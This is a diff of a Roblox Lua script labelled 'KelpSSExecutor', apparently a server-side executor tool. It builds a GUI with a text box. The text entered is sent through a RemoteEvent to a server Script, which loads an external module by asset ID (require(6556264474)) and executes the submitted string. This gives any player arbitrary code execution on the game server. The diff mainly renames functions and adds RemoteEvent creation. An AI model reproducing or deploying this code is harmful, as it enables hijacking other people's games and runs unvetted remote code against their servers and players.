@@ -1,4 +1,4 @@
--- KelpSSExecutor --
+
 local Kelp = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -14,8 +14,6 @@ local TextLabel = Instance.new("TextLabel")
 local TextLabel_2 = Instance.new("TextLabel")
 local Holder = Instance.new("TextBox")
 local C = Instance.new("TextButton")
-
---Properties:
 
 Kelp.Name = "Kelp"
 Kelp.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -148,21 +146,21 @@ C.TextSize = 14.000
 
 -- Scripts:
 
-local function EBXLON_fake_script() -- Game.S 
+local function XPANQ_fake_script() -- Game.S 
 	local script = Instance.new('LocalScript', Game)
 
 	script.Parent.Text = game.Name
 end
-coroutine.wrap(EBXLON_fake_script)()
-local function RXZPGI_fake_script() -- Close.LocalScript 
+coroutine.wrap(XPANQ_fake_script)()
+local function YKNVE_fake_script() -- Close.LocalScript 
 	local script = Instance.new('LocalScript', Close)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Parent.Frame.Visible = false
 	end)
 end
-coroutine.wrap(RXZPGI_fake_script)()
-local function SQGC_fake_script() -- Exec.LocalScript 
+coroutine.wrap(YKNVE_fake_script)()
+local function TCAHQCM_fake_script() -- Exec.LocalScript 
 	local script = Instance.new('LocalScript', Exec)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -170,25 +168,28 @@ local function SQGC_fake_script() -- Exec.LocalScript
 		script.Parent.Parent.Remote:FireServer(input.Text)
 	end)
 end
-coroutine.wrap(SQGC_fake_script)()
-local function KLQSUE_fake_script() -- C.LocalScript 
+coroutine.wrap(TCAHQCM_fake_script)()
+local function XKDQGXN_fake_script() -- C.LocalScript 
 	local script = Instance.new('LocalScript', C)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Holder.Text = ""
 	end)
 end
-coroutine.wrap(KLQSUE_fake_script)()
-local function JVAYB_fake_script() -- Frame.Script 
+coroutine.wrap(XKDQGXN_fake_script)()
+local function GYRCJMK_fake_script() -- Frame.Script 
 	local script = Instance.new('Script', Frame)
 
 	local remote = script.Parent.Remote
 	remote.OnServerEvent:Connect(function(player, ss)
-		
+		local Remote = Instance.new("RemoteEvent")
+		Remote.Name = "Remote"
+		Remote.Parent = script.Parent.Parent.Frame
+		wait(1)
 		local load = require(6556264474)
 		
 		wait(1)
 		load (ss) ()
 	end)
 end
-coroutine.wrap(JVAYB_fake_script)()
+coroutine.wrap(GYRCJMK_fake_script)()
